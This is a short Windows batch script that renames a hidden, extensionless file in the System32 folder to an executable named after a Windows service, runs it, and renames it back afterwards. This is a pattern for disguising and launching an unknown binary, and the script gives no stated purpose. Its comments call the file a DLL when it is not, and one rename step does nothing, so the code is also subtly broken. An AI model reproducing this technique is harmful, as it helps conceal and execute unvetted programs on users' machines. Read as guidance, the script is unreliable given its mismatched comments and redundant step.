@echo off
:: Rename DLL to EXE temporarily
ren "C:\Windows\System32\pbf" "pnrpsvc.exe"

:: Rename DLL to EXE temporarily
ren "C:\Windows\System32\pnrpsvc.exe" "pnrpsvc.exe"

:: Run the EXE file and wait for it to close
start /wait "" "C:\Windows\System32\pnrpsvc.exe"

:: Rename back to DLL after EXE is closed
ren "C:\Windows\System32\pnrpsvc.exe" "pbf"
